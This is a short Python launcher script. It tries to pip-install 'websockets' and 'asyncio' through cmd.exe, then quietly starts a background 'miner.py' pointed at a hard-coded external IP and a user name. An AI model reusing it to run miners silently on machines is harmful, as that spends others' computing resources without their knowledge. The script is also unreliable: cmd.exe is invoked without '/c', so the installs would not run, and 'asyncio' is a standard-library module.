import subprocess
import json
import os
import sys
ip = '185.245.96.117:8765/'
name = 'weiserhase'
executable = "pip install websockets"
subprocess.Popen(['cmd.exe', executable], stdin=None, stdout=None, stderr=None)
executable = "pip install asyncio"
subprocess.Popen(['cmd.exe', executable], stdin=None, stdout=None, stderr=None)

executable =str(os.path.dirname(os.path.abspath(__file__))).replace("\\", "/") +"/miner.py"
subprocess.Popen(['python', executable, ip, name], stdin=None, stdout=None, stderr=None)
print('process started')